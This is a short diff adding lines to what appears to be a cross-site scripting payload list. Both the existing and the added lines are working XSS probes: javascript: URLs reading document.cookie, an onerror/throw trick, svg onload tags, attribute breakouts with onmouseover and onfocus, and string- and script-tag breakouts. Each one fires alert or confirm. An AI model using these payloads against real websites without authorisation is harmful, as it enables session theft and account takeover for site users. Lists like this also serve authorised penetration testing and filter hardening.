@@ -1,2 +1,10 @@
 javascript://%e2%80%a8alert(document.cookie);
 a=8,b=confirm,c=window,c.onerror=b;throw-a
+<svg onload=alert(6)>
+"><svg onload=alert(6)//
+"onmouseover=alert(6)//
+"autofocus/onfocus=alert(6)//
+'-alert(6)-'
+'-alert(6)//
+\'-alert(6)//
+</script><svg onload=alert(6)>
